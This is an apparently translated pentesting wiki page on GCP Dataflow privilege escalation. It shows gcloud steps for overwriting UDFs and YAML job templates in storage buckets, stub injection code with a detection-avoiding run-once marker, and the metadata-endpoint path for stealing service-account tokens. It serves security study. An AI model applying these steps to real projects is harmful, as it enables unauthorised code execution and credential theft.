# GCP - Dataflow Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### `storage.objects.create`, `storage.objects.get`, `storage.objects.update`

Dataflow, GCS'de depolanan UDF'lerin ve job template YAML'larının bütünlüğünü doğrulamaz.
Bucket yazma erişimi ile bu dosyaları üzerine yazarak kod enjekte edebilir, worker'larda kod çalıştırabilir, servis hesabı token'larını çalabilir veya veri işleme süreçlerini değiştirebilirsiniz.
Hem batch hem de streaming pipeline işleri bu saldırı için uygun hedeflerdir. Bu saldırıyı bir pipeline üzerinde gerçekleştirmek için UDF'leri/şablonları iş çalışmadan önce, ilk birkaç dakika içinde (iş worker'ları oluşturulmadan önce) veya iş çalışırken yeni worker'lar başlamadan önce (autoscaling nedeniyle) değiştirmemiz gerekir.

**Attack vectors:**
- **UDF hijacking:** Pipelines tarafından referans verilen ve müşteri tarafından yönetilen bucket'larda depolanan Python (`.py`) ve JS (`.js`) UDF'ler
- **Job template hijacking:** Müşteri tarafından yönetilen bucket'larda depolanan özel YAML pipeline tanımları


> [!WARNING]
> **Run-once-per-worker trick:** Dataflow UDFs and template callables are invoked **per row/line**. Without coordination, exfiltration or token theft would run thousands of times, causing noise, rate limiting, and detection. Use a **file-based coordination** pattern: check if a marker file (e.g. `/tmp/pwnd.txt`) exists at the start; if it exists, skip malicious code; if not, run the payload and create the file. This ensures the payload runs **once per worker**, not per line.


#### Direct exploitation via gcloud CLI

1. Enumerate Dataflow jobs and locate the template/UDF GCS paths:

<details>

<summary>Template yolunu, staging konumunu ve UDF referanslarını almak için işleri listeleyip describe komutunu kullanın</summary>
```bash
# List jobs (optionally filter by region)
gcloud dataflow jobs list --region=<region>
gcloud dataflow jobs list --project=<PROJECT_ID>

# Describe a job to get template GCS path, staging location, and any UDF/template references
gcloud dataflow jobs describe <JOB_ID> --region=<region> --full --format="yaml"
# Look for: currentState, createTime, jobMetadata, type (JOB_TYPE_STREAMING or JOB_TYPE_BATCH)
# Pipeline options often include: tempLocation, stagingLocation, templateLocation, or flexTemplateGcsPath
```
</details>

2. Orijinal UDF veya iş şablonunu GCS'den indir:

<details>

<summary>Bucket'tan UDF dosyasını veya YAML şablonunu indir</summary>
```bash
# If job references a UDF at gs://bucket/path/to/udf.py
gcloud storage cp gs://<BUCKET>/<PATH>/<udf_file>.py ./udf_original.py

# Or for a YAML job template
gcloud storage cp gs://<BUCKET>/<PATH>/<template>.yaml ./template_original.yaml
```
</details>

3. Dosyayı yerel olarak düzenleyin: kötü amaçlı yükü enjekte edin (aşağıdaki Python UDF veya YAML parçacıklarına bakın) ve run-once coordination pattern'in kullanıldığından emin olun.

4. Orijinal dosyanın üzerine yazmak için yeniden yükleyin:

<details>

<summary>Bucket içindeki UDF veya template'i üzerine yaz</summary>
```bash
gcloud storage cp ./udf_injected.py gs://<BUCKET>/<PATH>/<udf_file>.py

# Or for YAML
gcloud storage cp ./template_injected.yaml gs://<BUCKET>/<PATH>/<template>.yaml
```
</details>

5. Bir sonraki job çalışmasını bekleyin veya (streaming için) autoscaling'i tetikleyin (ör. pipeline girişini aşırı yükleyerek) böylece yeni worker'lar başlatılır ve değiştirilmiş dosyayı çeker.

#### Python UDF injection

Eğer worker'ın exfiltrate data to your C2 server yapmasını istiyorsanız `urllib.request` kullanın ve `requests` kullanmayın.
`requests` classic Dataflow workers üzerinde önceden kurulu değildir.

<details>

<summary>Malicious UDF with run-once coordination and metadata extraction</summary>
```python
import os
import json
import urllib.request
from datetime import datetime

def _malicious_func():
# File-based coordination: run once per worker.
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return

# malicous code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")

def transform(line):
# Malicous code entry point - runs per line but coordination ensures once per worker
try:
_malicious_func()
except Exception:
pass
# ... original UDF logic follows ...
```
</details>


#### İş şablonu YAML injection

Koordinasyon dosyası kullanan callable bir `MapToFields` adımı enjekte edin. `requests` destekleyen YAML tabanlı pipeline'lar için, şablon `dependencies: [requests]` bildirmişse `requests`'i kullanın; aksi halde `urllib.request`'i tercih edin.

Pipeline'ın hedefe hâlâ geçerli veri yazmasını sağlamak için temizleme adımını (`drop: [malicious_step]`) ekleyin.

<details>

<summary>Pipeline YAML içinde Kötücül MapToFields adımı ve temizleme</summary>
```yaml
- name: MaliciousTransform
type: MapToFields
input: Transform
config:
language: python
fields:
malicious_step:
callable: |
def extract_and_return(row):
import os
import json
from datetime import datetime
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return True
try:
import urllib.request
# malicious code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")
except Exception:
pass
return True
append: true
- name: CleanupTransform
type: MapToFields
input: MaliciousTransform
config:
fields: {}
append: true
drop:
- malicious_step
```
</details>

### Compute Engine'in Dataflow Workers'a Erişimi

**İzinler:** `compute.instances.osLogin` veya `compute.instances.osAdminLogin` (worker SA üzerinde `iam.serviceAccounts.actAs` ile), veya eski SSH anahtarı enjeksiyonu için `compute.instances.setMetadata` / `compute.projects.setCommonInstanceMetadata` (`iam.serviceAccounts.actAs` ile)

Dataflow workers, Compute Engine VM'leri olarak çalışır. OS Login veya SSH aracılığıyla worker'lara erişim, metadata endpoint'inden SA token'larını (`http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`) okumanıza, verileri manipüle etmenize veya rastgele kod çalıştırmanıza olanak tanır.

İstismar detayları için bakınız:
- [GCP - Compute Privesc](gcp-compute-privesc/README.md) — `compute.instances.osLogin`, `compute.instances.osAdminLogin`, `compute.instances.setMetadata`

## Referanslar

- [Dataflow Rider: How Attackers can Abuse Shadow Resources in Google Cloud Dataflow](https://www.varonis.com/blog/dataflow-rider)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [gcloud dataflow jobs describe](https://cloud.google.com/sdk/gcloud/reference/dataflow/jobs/describe)
- [Apache Beam YAML: User-defined functions](https://beam.apache.org/documentation/sdks/yaml-udf/)
- [Apache Beam YAML Transform Reference](https://beam.apache.org/releases/yamldoc/current/)

{{#include ../../../banners/hacktricks-training.md}}
